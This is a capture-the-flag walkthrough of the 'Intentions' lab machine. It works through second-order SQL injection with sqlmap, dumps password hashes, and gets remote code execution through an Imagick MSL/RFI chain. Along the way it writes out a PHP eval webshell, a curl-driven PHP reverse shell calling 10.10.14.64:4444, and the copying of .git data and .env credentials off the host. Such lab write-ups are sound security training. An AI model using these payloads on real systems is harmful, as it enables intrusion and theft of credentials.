# Intentions

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 10.129.19.213 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 21:33 +08
Nmap scan report for 10.129.19.213
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

We don't need to add any domains for this machine. Since only port 80 is open, we should be proxying the traffic through Burpsuite.&#x20;

### Image Gallery Enumeration

Port 80 reveals a basic login page:

<figure><img src="../../.gitbook/assets/image (1154).png" alt=""><figcaption></figcaption></figure>

The HTTP requests sent when visiting this page are rather interesting:

{% code overflow="wrap" %}
```http
GET / HTTP/1.1
Host: 10.129.19.213
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6InJqcUJXNjhydWtBVm5vbUgwbTlHS2c9PSIsInZhbHVlIjoialliMWxUQU1SOHFLQkJQTjdSd3pVcGxzajArMk1DM2pCaVFNZmlweWJOcWhBQWs0RU9hOWQ2Y2ZLTmpjdG9leFNQeW1mSWhOSjNJOVI1Z0s4RkRjd0MvTjZiTzc5bXNmTTNJT1pVQ1dmalNFbm14Nk1ZN1FraHNvU3IxM2xabVQiLCJtYWMiOiJhYjFiYTI5YTQ0NzMyOTRhMzUyZjM4YzJjZDk1NmY1MmJmMGI1YzNhZTI4NjA4Yzk3ZWJlM2E0NDU3OTNiZDc5IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImN5d0szS3JvWDFkZnFPWG9rd1RHRnc9PSIsInZhbHVlIjoiTUJmV21QVG1Yb1NoZ0V6TlNVNWpPWERvRW5qVEJibnh6MlRzTmFrdys0WkVpTVJrMEcvajJyb28wanBhd3ZtV3lkVlNVRkVSZ2txVzE4UGEzT3FvOHJYV2taRTJUTEFhc29pbVpOWFM4bWxDWUZKRWJTNTdKeG9JZ1FkSTh3bmciLCJtYWMiOiJhYWQyZDAwNDAxNWEzMzg0MTA4MjE1N2YzMzcwZGI1OWEwZmNhNDZjYjU1MmZhNzNlZDczZTc0NDhhMDc3MTA2IiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1

```
{% endcode %}

So there are some forms of `base64` encoded cookies involved in this website. Anyways, I registered a new user and logged in to view the gallery:

<figure><img src="../../.gitbook/assets/image (1294).png" alt=""><figcaption></figcaption></figure>

When we login, there is an extra cookie called `token` that is being assigned. It's a JWT token with this value:

<figure><img src="../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

Again, not sure what to do with this yet. We can click on the 'Gallery' option to see the traffic generated:

<figure><img src="../../.gitbook/assets/image (3538).png" alt=""><figcaption></figcaption></figure>

From the looks of it, it seems that the backend uses some kind of SQL database based on the data returned. When we view our 'Profile', we can see that there is an option to update it with our favourite genres:

<figure><img src="../../.gitbook/assets/image (2738).png" alt=""><figcaption></figcaption></figure>

This sends this POST request to the backend:

```http
POST /api/v1/gallery/user/genres HTTP/1.1
Host: 10.129.19.213
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6ImM2YmgvbDlaMlA1RE1vdmhmNUE4NXc9PSIsInZhbHVlIjoiaFJiS0tWNU5jYnRmTFJKUk5wSC9pR0x0ZVcwejdHV3RmRHh6WDNEdmwrV1hTSXh6VGVja1JOMWYrYlpUbHg2azRqRlN5bmlWTEh0eldpWlF3RVFNUEZaVXNxY1hVZGVkUXJmQlp4b2dIdHBYZ0JCOGM0Qk04cmpkdEt2bEVuZEYiLCJtYWMiOiI2YTIxNWUzNTNlYjEzNGM1MmI5OWRlMTg0NTg4MjMwODJiNmIwYjJlY2E4OTM0ZjA4M2QyMTM3NDViYjg1YmVjIiwidGFnIjoiIn0=
Content-Length: 31
Origin: http://10.129.19.213
Connection: close
Referer: http://10.129.19.213/gallery
Cookie: XSRF-TOKEN=eyJpdiI6ImM2YmgvbDlaMlA1RE1vdmhmNUE4NXc9PSIsInZhbHVlIjoiaFJiS0tWNU5jYnRmTFJKUk5wSC9pR0x0ZVcwejdHV3RmRHh6WDNEdmwrV1hTSXh6VGVja1JOMWYrYlpUbHg2azRqRlN5bmlWTEh0eldpWlF3RVFNUEZaVXNxY1hVZGVkUXJmQlp4b2dIdHBYZ0JCOGM0Qk04cmpkdEt2bEVuZEYiLCJtYWMiOiI2YTIxNWUzNTNlYjEzNGM1MmI5OWRlMTg0NTg4MjMwODJiNmIwYjJlY2E4OTM0ZjA4M2QyMTM3NDViYjg1YmVjIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IlZyd1ZTaVJBYnRuSldRS1VHM21xS0E9PSIsInZhbHVlIjoiVTBFUU5BRlExWEt0M0ZFcW0zYTcvMCszc0NjN3puUFp4WWFqbldRTzllcVllTXhyUitaV1BsVlVNSWZwRmN2cSt0UW15YnNrTlRsOHhha25LWE5FM1J5NWpvUTRXMWl6TkM5bkM1ZXN6YnRwMkxUQXRZWHVZSEM4YmpBdjVNNGUiLCJtYWMiOiIyY2FlNGQyYzk0N2FjYjRkNGJmNDMzMGUwNDcxYmE3YTZkYjE2YjU3NWUwYmQxYmJmMzc4NWZjNWQyMjUxZjY2IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE5LjIxMy9hcGkvdjEvYXV0aC9sb2dpbiIsImlhdCI6MTY4ODM5MTU5MCwiZXhwIjoxNjg4NDEzMTkwLCJuYmYiOjE2ODgzOTE1OTAsImp0aSI6Ijc2SEN0V1UzNmdyQm9oejMiLCJzdWIiOiIyOCIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.xEkDG7ysM7cu2yayeEOBvNmMJQ4fUF1UxlZdLs4GHvA

{"genres":"food,travel,nature"}
```

I did a `gobuster` scan for the `/api` directory and a `feroxbuster` scan on the general website to find more stuff too.&#x20;

`feroxbuster` picked up on one interesting file:

<pre><code>$ feroxbuster -u http://10.129.19.213 -x js,html,php,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.19.213
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [js, html, php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
<strong>200      GET        2l     6382w   311246c http://10.129.19.213/js/admin.js
</strong>200      GET        2l     5429w   279176c http://10.129.19.213/js/login.js
200      GET        2l     7687w   433792c http://10.129.19.213/js/app.js
</code></pre>

Within the `admin.js` file, when we search for the string 'password', we can see this comment at the bottom:

{% code overflow="wrap" %}
```
Hey team, I've deployed the v2 API to production and have started using it in the admin section. \n                Let me know if you spot any bugs. \n                This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text! \n                By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.\n                This should take care of the concerns raised by our users regarding our lack of HTTPS connection.\n

The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some :)
```
{% endcode %}

So the API takes the calculated hashed password of the user and passes it for authentication, meaning that if we were to get hashes, we don't actually need to crack them at all. This v2 API looks rather suspicious, but I was unable to interact with it much as no directory scans were returning anything useful.&#x20;

This was when I got stuck.

### 2nd Order SQL Injection --> API Login

The only point of weakness seems to be that 'Genre' updating feature, so I went straight into that. When viewing the payload used my `sqlmap`, I realised it was being sent without the spaces accounted for:

{% code overflow="wrap" %}
```
{"genres":"food,travel,nature')ORROW(3888,4310)>(SELECTCOUNT(*),CONCAT(0x71787a7a71,(SELECT(ELT(3888=3888,1))),0x71626a6b71,FLOOR(RAND(0)*2))xFROM(SELECT2102UNIONSELECT1050UNIONSELECT3584UNIONSELECT2456)aGROUPBYx)AND('PEfz'LIKE'PEfz"}
```
{% endcode %}

To resolve this, I used the `--tamper=space2plus` flag. While the `sqlmap` ran, I checked the other parts of the website. If we attempt to view the `/feed`, there is a weird error response captured:

<figure><img src="../../.gitbook/assets/image (1950).png" alt=""><figcaption></figcaption></figure>

This normally didn't happen because requests to this would return images with their IDs. This highlights that the injection results might only be viewable when we send a request here instead, thus making the website potentially vulnerable to 2nd order SQL Injection:

{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap" %}

`sqlmap` has the flag `--second-req` to test this. I also noticed that the SQL Injections were still failing, so I tried different tampers such as `space2comment` instead, and it worked!

```
$ sqlmap -r req --tamper=space2comment --batch --second-req req2
---
Parameter: JSON genres ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"genres":"food,travel,nature') AND 1039=1039 AND ('IkOG'='IkOG"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"genres":"food,travel,nature') AND (SELECT 6642 FROM (SELECT(SLEEP(5)))gerB) AND ('DLAJ'='DLAJ"}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 7 columns
    Payload: {"genres":"food,travel,nature') UNION ALL SELECT NULL,CONCAT(0x716b767671,0x736f6e536e4368556659467759684c574d455759615a5663427247796a62596547774d786a444c5a,0x71626b7171),NULL,NULL,NULL#"}
---
```

Using this, we can attempt to enumerate the database:

```
available databases [2]:
[*] information_schema
[*] intentions

Database: intentions
[4 tables]
+------------------------+
| gallery_images         |
| migrations             |
| personal_access_tokens |
| users                  |
+------------------------+

Table: users
[8 columns]
+------------+---------------------+
| Column     | Type                |
+------------+---------------------+
| admin      | int(11)             |
| created_at | timestamp           |
| email      | varchar(255)        |
| genres     | text                |
| id         | bigint(20) unsigned |
| name       | varchar(255)        |
| password   | varchar(255)        |
| updated_at | timestamp           |
+------------+---------------------+
```

Afterwards, the hashes for the users can be found:

```
$ sqlmap -r req --tamper=space2comment --batch --second-req req2 -D intentions -T users --dump
+----+--------------------------+-------+-------------------------------+---------------------------+--------------------------------------------------------------+---------------------+---------------------+
| id | name                     | admin | email                         | genres                    | password                                                     | created_at          | updated_at          |
+----+--------------------------+-------+-------------------------------+---------------------------+--------------------------------------------------------------+---------------------+---------------------+
| 1  | steve                    | 1     | steve@intentions.htb          | food,travel,nature        | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa | 2023-02-02 17:43:00 | 2023-02-02 17:43:00 |
| 2  | greg                     | 1     | greg@intentions.htb           | food,travel,nature        | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m | 2023-02-02 17:44:11 | 2023-02-02 17:44:11 |
| 3  | Melisa Runolfsson        | 0     | hettie.rutherford@example.org | food,travel,nature        | $2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 4  | Camren Ullrich           | 0     | nader.alva@example.org        | food,travel,nature        | $2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 5  | Mr. Lucius Towne I       | 0     | jones.laury@example.com       | food,travel,nature        | $2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 6  | Jasen Mosciski           | 0     | wanda93@example.org           | food,travel,nature        | $2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 7  | Monique D'Amore          | 0     | mwisoky@example.org           | food,travel,nature        | $2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7. | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 8  | Desmond Greenfelder      | 0     | lura.zieme@example.org        | food,travel,nature        | $2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 9  | Mrs. Roxanne Raynor      | 0     | pouros.marcus@example.net     | food,travel,nature        | $2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 10 | Rose Rutherford          | 0     | mellie.okon@example.com       | food,travel,nature        | $2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 11 | Dr. Chelsie Greenholt I  | 0     | trace94@example.net           | food,travel,nature        | $2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 12 | Prof. Johanna Ullrich MD | 0     | kayleigh18@example.com        | food,travel,nature        | $2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 13 | Prof. Gina Brekke        | 0     | tdach@example.com             | food,travel,nature        | $2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2. | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 14 | Jarrett Bayer            | 0     | lindsey.muller@example.org    | food,travel,nature        | $2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 15 | Macy Walter              | 0     | tschmidt@example.org          | food,travel,nature        | $2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 16 | Prof. Devan Ortiz DDS    | 0     | murray.marilie@example.com    | food,travel,nature        | $2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 17 | Eula Shields             | 0     | barbara.goodwin@example.com   | food,travel,nature        | $2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 18 | Mariano Corwin           | 0     | maggio.lonny@example.org      | food,travel,nature        | $2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 19 | Madisyn Reinger DDS      | 0     | chackett@example.org          | food,travel,nature        | $2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 20 | Jayson Strosin           | 0     | layla.swift@example.net       | food,travel,nature        | $2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 21 | Zelda Jenkins            | 0     | rshanahan@example.net         | food,travel,nature        | $2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 22 | Eugene Okuneva I         | 0     | shyatt@example.com            | food,travel,nature        | $2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 23 | Mrs. Rhianna Hahn DDS    | 0     | sierra.russel@example.com     | food,travel,nature        | $2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 24 | Viola Vandervort DVM     | 0     | ferry.erling@example.com      | food,travel,nature        | $2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 25 | Prof. Margret Von Jr.    | 0     | beryl68@example.org           | food,travel,nature        | $2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 26 | Florence Crona           | 0     | ellie.moore@example.net       | food,travel,nature        | $2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 27 | Tod Casper               | 0     | littel.blair@example.org      | food,travel,nature        | $2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 28 | test123                  | 0     | test123@gmail.com             | food,__REFLECTED_VALUE__# | $2y$10$7bfEqTkVy1LBAQa7wCpe2uUrQkDbeFXYb0v2dNaggPaxnP/W4M8H. | 2023-07-03 13:39:34 | 2023-07-03 14:12:11 |
+----+--------------------------+-------+-------------------------------+---------------------------+--------------------------------------------------------------+---------------------+---------------------+
```

`greg` and `steve` are both the administrators of the website, and we have their Bcrypt hashes. I used the same method to login for the v1 API, which involved sending a POST request to `/api/v1/auth/login`, and it responds as I expected:

<figure><img src="../../.gitbook/assets/image (3560).png" alt=""><figcaption></figcaption></figure>

Sending the correct parameters resulted in a successful login as `greg`, which generates a valid token.

<figure><img src="../../.gitbook/assets/image (1431).png" alt=""><figcaption></figcaption></figure>

### Admin API --> RCE

We can grab the `token` value we were returned on the successful login. Now, we need to find the directory about 'image editing'. We can repeat the above request in a browser, and then check the `/admin` directory, which now works properly:

<figure><img src="../../.gitbook/assets/image (3191).png" alt=""><figcaption></figcaption></figure>

The link brings us to the PHP page for Imagick:

{% embed url="https://www.php.net/manual/en/class.imagick.php" %}

Going to "Images" reveals that we can edit them:

<figure><img src="../../.gitbook/assets/image (3564).png" alt=""><figcaption></figcaption></figure>

We can edit the images using 4 different effects:

<figure><img src="../../.gitbook/assets/image (3555).png" alt=""><figcaption></figcaption></figure>

This would send a POST request to the v2 API:

{% code overflow="wrap" %}
```http
POST /api/v2/admin/image/modify HTTP/1.1
Host: 10.129.19.213
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IjloNURXNUpRQUNCb2tyUThhZDV1ZGc9PSIsInZhbHVlIjoiYUJZYVRmMVhHUEUwTS9FZk43eTF2TlpPY0tocEJnZlZnbFU2YnZCTDBNZlNqWmlYYmRvcjFPYWxiNEJkSXlLUjVkbEFWcHNuYnhOSFlsZExCTGw4eUhBUTJVR3RiVmxyQ2NDMGVzRDdXeVRzMmlOZmsxaXhVSnRSQXYyNWJhWEEiLCJtYWMiOiIzNjBlMTE1ZWExYjQwMzYwZGU2MDgyYWY2M2VhZDdmMzU3ZWEzOTNmMzcyNzVlMWJiNmEyMDYzY2UyMWI0ODg5IiwidGFnIjoiIn0=
Content-Length: 112
Origin: http://10.129.19.213
Connection: close
Referer: http://10.129.19.213/admin
Cookie: XSRF-TOKEN=eyJpdiI6IjloNURXNUpRQUNCb2tyUThhZDV1ZGc9PSIsInZhbHVlIjoiYUJZYVRmMVhHUEUwTS9FZk43eTF2TlpPY0tocEJnZlZnbFU2YnZCTDBNZlNqWmlYYmRvcjFPYWxiNEJkSXlLUjVkbEFWcHNuYnhOSFlsZExCTGw4eUhBUTJVR3RiVmxyQ2NDMGVzRDdXeVRzMmlOZmsxaXhVSnRSQXYyNWJhWEEiLCJtYWMiOiIzNjBlMTE1ZWExYjQwMzYwZGU2MDgyYWY2M2VhZDdmMzU3ZWEzOTNmMzcyNzVlMWJiNmEyMDYzY2UyMWI0ODg5IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6Ik5LS0x5UjJucUJ3aTdLYVphdnFUQUE9PSIsInZhbHVlIjoiajhNNWNmVFRpUDZqMkROU3VVbUdGZUtLd3ZGeWVjcGxzcmNhUXlnOTlldnJVaUJuZDJYSE9wd1BNU0RmTS84T1pDdndpQ2lTZ3E3em1RZ2x3cFluRDRyWU51d0M4ZlB4Qk80VUFQV0N6Y2RyK3pQTVVha1hJZHg0cXFHMm10TDMiLCJtYWMiOiI4NTU1NmEzNDg2ZTYyNzBiODExNWRlMzA3Mjc5Zjk5YzAyODU0MmViZmMzNzdhNTA2YTEyOTE3Yjg3ZWZmMmIzIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE5LjIxMy9hcGkvdjIvYXV0aC9sb2dpbiIsImlhdCI6MTY4ODM5Mzg1MywiZXhwIjoxNjg4NDE1NDUzLCJuYmYiOjE2ODgzOTM4NTMsImp0aSI6IkFFcXROUHlMR25wNU1NZUMiLCJzdWIiOiIyIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.3l-LRqW9Z1cf_Ewny0HOPdXtJhz-kk6cxKwje29dVUw



{"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg","effect":"wave"}
```
{% endcode %}

Googling for Imagick PHP exploits led me to this page showing an RCE:

{% embed url="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/" %}

The above exploit uses an RFI to load some PHP objects for RCE. We can test this with the website:

```json
{"path":"http://10.10.14.64/hiiamrfi","effect":"wave"}
```

<figure><img src="../../.gitbook/assets/image (2924).png" alt=""><figcaption></figcaption></figure>

Since this was vulnerable to RFI, there's a high chance that it is vulnerable to the exploit above. We can follow the PoC to make it work. Firstly, we need to create a reverse shell payload within an image.&#x20;

```
$ convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' positive.png
```

Host this image on a HTTP server, and now comes the tricky part of uploading it (which involves some brute forcing). There seem to be 2 payloads involved in this:

* One involving `vid:ms1:/tmp/php*`.
* One with the form-data uploading `positive.png` to the server as `cmd.php`.&#x20;

To start this, we can follow the PoC and use Burp Intruder to do send a lot of requests. Here's the first request:

```http
POST /api/v2/admin/image/modify HTTP/1.1
Host: 10.129.19.213
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/json
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE5LjIxMy9hcGkvdjIvYXV0aC9sb2dpbiIsImlhdCI6MTY4ODM5Mzc1NCwiZXhwIjoxNjg4NDE1MzU0LCJuYmYiOjE2ODgzOTM3NTQsImp0aSI6IjJFU1NGWHA5Sno4VVh1Y1EiLCJzdWIiOiIyIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.TXkEvefZecbOrVTbd20__gfPgBcKwvyFO-bEcq5HCo4
Content-Length: 306
Connection: close

{
    'path': 'vid:msl:/tmp/php*',
    'effect': 'charcoal'
}
```

And here's the second request:

```
POST /api/v2/admin/image/modify HTTP/1.1
Host: 10.129.19.213
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: multipart/form-data; boundary=--ABC
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE5LjIxMy9hcGkvdjIvYXV0aC9sb2dpbiIsImlhdCI6MTY4ODM5Mzc1NCwiZXhwIjoxNjg4NDE1MzU0LCJuYmYiOjE2ODgzOTM3NTQsImp0aSI6IjJFU1NGWHA5Sno4VVh1Y1EiLCJzdWIiOiIyIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.TXkEvefZecbOrVTbd20__gfPgBcKwvyFO-bEcq5HCo4

Content-Length: 305
Accept: */*



--ABC
Content-Disposition: form-data; name="swarm"; filename="§swarm.msl§"
Content-Type: application/octet-stream
 
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="http://10.10.14.64/positive.png" />
 <write filename="info:/var/www/html/intentions/public/cmd.php" />
</image>
--ABC--
```

Lastly, we can have a `bash` loop running to give us a reverse shell using a basic PHP reverse shell from [revshells.com](https://www.revshells.com/).

{% code overflow="wrap" %}
```bash
$ while true; do curl -G --data-urlencode 'a=$sock=fsockopen("10.10.14.64",4444);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' http://10.129.19.213/cmd.php 2> /dev/null; done
```
{% endcode %}

Then, we just need to start both the payloads within Burpsuite Intruder with NULL requests.&#x20;

<figure><img src="../../.gitbook/assets/image (2659).png" alt=""><figcaption></figcaption></figure>

When we run it both the Intruder instances, we would get a few requests to our Python HTTP server, and a reverse shell as `www-data`!&#x20;

<figure><img src="../../.gitbook/assets/image (3180).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (760).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Git Repo --> Greg Creds

I noticed that the web directory had a `.git` folder:

```
www-data@intentions:~/html/intentions$ ls -la
total 820
drwxr-xr-x  14 root     root       4096 Feb  2 17:55 .
drwxr-xr-x   3 root     root       4096 Feb  2 17:55 ..
-rw-r--r--   1 root     root       1068 Feb  2 17:38 .env
drwxr-xr-x   8 root     root       4096 Feb  3 00:51 .git
-rw-r--r--   1 root     root       3958 Apr 12  2022 README.md
drwxr-xr-x   7 root     root       4096 Apr 12  2022 app
-rwxr-xr-x   1 root     root       1686 Apr 12  2022 artisan
drwxr-xr-x   3 root     root       4096 Apr 12  2022 bootstrap
-rw-r--r--   1 root     root       1815 Jan 29 19:58 composer.json
-rw-r--r--   1 root     root     300400 Jan 29 19:58 composer.lock
drwxr-xr-x   2 root     root       4096 Jan 29 19:26 config
drwxr-xr-x   5 root     root       4096 Apr 12  2022 database
-rw-r--r--   1 root     root       1629 Jan 29 20:17 docker-compose.yml
drwxr-xr-x 534 root     root      20480 Jan 30 23:38 node_modules
-rw-r--r--   1 root     root     420902 Jan 30 23:38 package-lock.json
-rw-r--r--   1 root     root        891 Jan 30 23:38 package.json
-rw-r--r--   1 root     root       1139 Jan 29 19:15 phpunit.xml
drwxr-xr-x   5 www-data www-data   4096 Jul  3 16:10 public
drwxr-xr-x   7 root     root       4096 Jan 29 19:58 resources
drwxr-xr-x   2 root     root       4096 Jun 19 11:22 routes
-rw-r--r--   1 root     root        569 Apr 12  2022 server.php
drwxr-xr-x   5 www-data www-data   4096 Apr 12  2022 storage
drwxr-xr-x   4 root     root       4096 Apr 12  2022 tests
drwxr-xr-x  45 root     root       4096 Jan 29 19:58 vendor
-rw-r--r--   1 root     root        722 Feb  2 17:46 webpack.mix.js
```

The `.env` file also contained some interesting stuff, but it wasn't super useful because we already dumped the database earlier:

```
www-data@intentions:~/html/intentions$ cat .env
APP_NAME=Intentions
APP_ENV=production
APP_KEY=base64:YDGHFO792XTVdInb9gGESbGCyRDsAIRCkKoIMwkyHHI=
APP_DEBUG=false
APP_URL=http://intentions.htb

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=localhost
DB_PORT=3306
DB_DATABASE=intentions
DB_USERNAME=laravel
DB_PASSWORD=02mDWOgsOga03G385!!3Plcx
<TRUNCATED>
```

We cannot read the `git log` output for this folder:

```
www-data@intentions:~/html/intentions$ git log -p 2 
fatal: detected dubious ownership in repository at '/var/www/html/intentions'
To add an exception for this directory, call:

        git config --global --add safe.directory /var/www/html/intentions
```

In this case, what we can do is just copy the entire `.git` folder using `tar`, as `zip` and `7z` are both not present on the machine.&#x20;

```bash
cp -r .git /tmp/.git
tar -cvf rep.tar /tmp/.git
python3 -m http.server 4444
## on kali
wget <IP>:4444/rep.tar
```

